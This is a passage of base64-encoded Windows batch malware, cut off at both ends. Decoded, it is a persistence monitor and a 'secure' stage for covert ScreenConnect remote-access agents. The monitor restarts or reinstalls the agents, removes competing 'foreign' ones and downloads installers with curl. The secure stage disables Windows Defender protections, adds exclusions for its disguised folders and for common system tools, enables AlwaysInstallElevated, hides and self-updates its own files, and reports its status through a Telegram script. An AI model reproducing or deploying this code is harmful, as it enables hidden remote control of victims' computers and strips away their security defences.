IHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIg
Pm51bCAyPiYxCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCByZWluc3Rh
bGxlZCBPSyIKKQoKOkFmdGVySGVhbApyZW0gTTE2OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAt
PiByZXN0YXJ0LCB0aGVuIHJlcGFpci1ieS1HVUlEIChldmVyeSB0aWNrKQpzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVs
IDEgKAogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQg
IlJVTk5JTkciID5udWwKICBpZiBlcnJvcmxldmVsIDEgKAogICAgZWNobyBhbHQgc3RvcHBlZCAt
IHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiCiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwK
ICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJV
Tk5JTkciID5udWwKICAgIGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxU
X0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxCiAgKQopCnJlbSBNMTc6IEFMVCBz
ZXJ2aWNlIGVudHJ5IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnkt
R1VJRCBldmVyeSB0aWNrCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUp
IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBh
aXI+PiIlTE9HJSIKICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVX
RCUiID4+IiVMT0clIiAyPiYxCikKcmVtIChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1o
ZWFsIGluIFtFXTsgZm9yZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkKCnJlbSDilIDilIAg
W0ZdIHN0ZWFsdGggcmUtc2VjdXJlIChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVzaCkg
4pSA4pSACnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUNvbW1hbmQgInRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBh
dGggJyVXRCUnLCclRVRMJScgLUVycm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAyPiYx
CgpyZW0g4pSA4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBoIOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1Q
YXRoICclV0QlXG93bl9zZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVc
c2VjLmZsYWcnKSkgLW9yICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVX
RCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBleGl0IDEg
fSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcGVy
aW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUiCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPj4i
JUxPRyUiIDI+JjEKICBlY2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciCikKCnJlbSDilIDilIAgW0hd
IGNhbXBhaWduIHN0YXRlICsgaG91cmx5IGNvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAi
JVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFHJScpIC1hbmQgKE5l
dy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxBRyUnKS5MYXN0
V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDYwKXsgZXhpdCAwIH0gZWxzZSB7IGV4aXQgMSB9
IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIGhiPiVIQkZMQUclCiAgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
RmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQg
JU1PTlZFUiUgLUNvdW50ICFDT1VOVCEgPm51bCAyPiYxCiAgZWNobyBkaWdlc3QgSEIgc2VudD4+
IiVMT0clIgopCgpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0
aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiAi
JVNFTEZfVVBEJSI9PSIxIiAoCiAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIgogIGF0
dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxCiAgbW92ZSAveSAiJVdE
JVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjEKKQpyZW0ga2VlcCBk
dWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljawppZiBub3QgZXhpc3QgIiVFVEwlIiBt
a2RpciAiJUVUTCUiID5udWwgMj4mMQppZiBleGlzdCAiJVdEJVxvd25fbW9uLmNtZCIgKAogIGF0
dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQogIGNvcHkgL3kgIiVX
RCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxCikKZGVsIC9mIC9x
ICIlTVVURVglIiA+bnVsIDI+JjEKCmVjaG8gdGljayBkb25lOiBwcmltPSVQUklNX09LJSBhbHQ9
JUFMVF9PSyUgZm9yZWlnbj0lRk9SRUlHTl9MRUZUJT4+IiVMT0clIgplbmRsb2NhbApleGl0IC9i
IDAKCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAgaGVs
cGVycyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKOkluc3Rh
bGxNc2kKcmVtICUxPXVybCAlMj10YWcKc2V0ICJVUkw9JX4xIgpzZXQgIlRBRz0lfjIiCmVjaG8g
WyVUQUclXSBmZXRjaCAlVVJMJT4+IiVMT0clIgoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
LS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwl
IiA+PiIlTE9HJSIgMj4mMQpmb3IgJSVGIGluICgiJU1TSSUudG1wIikgZG8gaWYgJSV+ekYgTEVR
IDEwMDAwMDAgKAogIGVjaG8gWyVUQUclXSBmZXRjaCBmYWlsZWQ+PiIlTE9HJSIKICBkZWwgL2Yg
L3EgIiVNU0klLnRtcCIgPm51bCAyPiYxCiAgZXhpdCAvYiAxCikKbW92ZSAveSAiJU1TSSUudG1w
IiAiJU1TSSUiID5udWwgMj4mMQpjYWxsIDpOb01zaVBvbGljeQpyZW0gTTEzOiBzdGFsZSBwcmlt
YXJ5IGRpciAoc2VydmljZSBkZWxldGVkLCBwcm9kdWN0IHVucmVnaXN0ZXJlZCkgYnJlYWtzCnJl
bSB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFs
bGluZwpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
MQppZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAo
JUtFRVBfRlAlKSIgKAogIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIlTE9HJSIKICBy
bWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVs
IDI+JjEKKQplY2hvIFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiCm1zaWV4ZWMgL2kg
IiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAv
TCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxCnNldCAiTVNJRVhJVD0hRVJST1JMRVZF
TCEiCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiCmlmICIhTVNJ
RVhJVCEiPT0iMTYxOCIgKAogIGVjaG8gWyVUQUclXSBtc2lfYnVzeV9yZXRyeT4+IiVMT0clIgog
IHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bAogIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25v
cmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9o
ZWFsMi5sb2ciID5udWwgMj4mMQogIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiCiAgZWNobyBb
JVRBRyVdIG1zaWV4ZWNfcmV0cnkgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKKQpjYWxsIDpXYWl0
U3ZjCmV4aXQgL2IgMAoKOlJlcGFpclJlZ2lzdGVyZWQKcmVtICUxPWZpbmdlcnByaW50IC0gc2Vy
dmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6IHJlcGFpciBieSBHVUlELgpzYyBx
dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCV+MSkiID5udWwgMj4mMQppZiBub3QgZXJyb3Js
ZXZlbCAxIGV4aXQgL2IgMAppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2Ig
MQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiV+MSIg
LVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxCmNhbGwgOldhaXRTdmMKZXhpdCAvYiAwCgo6
UmVzdG9yZUFsdApyZW0gQUxUIHNlcnZpY2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAoU0Mt
ZmFtaWx5IG1zaWV4ZWMgc2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4Kc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQppZiBub3QgZXJyb3JsZXZl
bCAxIGV4aXQgL2IgMAplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0dGVtcHQ+PiIlTE9HJSIK
aWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
IC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIg
Mj4mMQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJS
VU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSIKZXhpdCAvYiAw
Cgo6Tm9Nc2lQb2xpY3kKcmVnIGRlbGV0ZSAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3Nv
ZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
XE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQg
L2QgMCAvZiA+bnVsIDI+JjEKZXhpdCAvYiAwCgo6V2FpdFN2YwpzZXQgIlRSSUVTPTAiCjpXYWl0
TG9vcApzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
UlVOTklORyIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxICgKICBzZXQgIklOU1RBTExFRD0xIgog
IHNldCAiUFJJTV9PSz0xIgogIGV4aXQgL2IgMAopCnNldCAvYSBUUklFUys9MQppZiAlVFJJRVMl
IEdFUSAxMCBleGl0IC9iIDEKcGluZyAxMjcuMC4wLjEgLW4gNyA+bnVsIDI+JjEKZ290byA6V2Fp
dExvb3AKCjpUZ1N0YXRlCnNldCAiTkVXU1RBVEU9JX4xIgpzZXQgIk1TRz0lfjIiCnNldCAiT0xE
U1RBVEU9IgppZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRFJSIKcmVt
IHJhdGUtbGltaXQgcmVwZWF0ZWQgRE9XTi9GQUlMOiBtYXggMSBhbGVydCBwZXIgMzAgbWluIHdo
aWxlIHN0dWNrCmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04iIGdvdG8gOk1heWJlU3VwcHJlc3MK
aWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVzcwpnb3RvIDpTZW5k
QWxlcnQKOk1heWJlU3VwcHJlc3MKaWYgL0kgIiVORVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYg
ZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1M
aXRlcmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0
ZXMgLWx0IDMwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjEKICBpZiBub3QgZXJyb3Js
ZXZlbCAxICgKICAgIGVjaG8gdGdfc3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUiCiAgICBl
eGl0IC9iIDAKICApCikKOlNlbmRBbGVydAplY2hvICVORVdTVEFURSU+IiVTVEFURSUiCmVjaG8g
c2VudD4iJVdEJVx0Z19zZW50LmZsYWciCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIg
LVN0YXRlICVORVdTVEFURSUgLVN1bW1hcnkgIiVNU0clIiAtQnVpbGQgJU1PTlZFUiUgLUNvdW50
ICVDT1VOVCUgPm51bCAyPiYxCmVjaG8gdGcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUi
CmV4aXQgL2IgMAo=
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
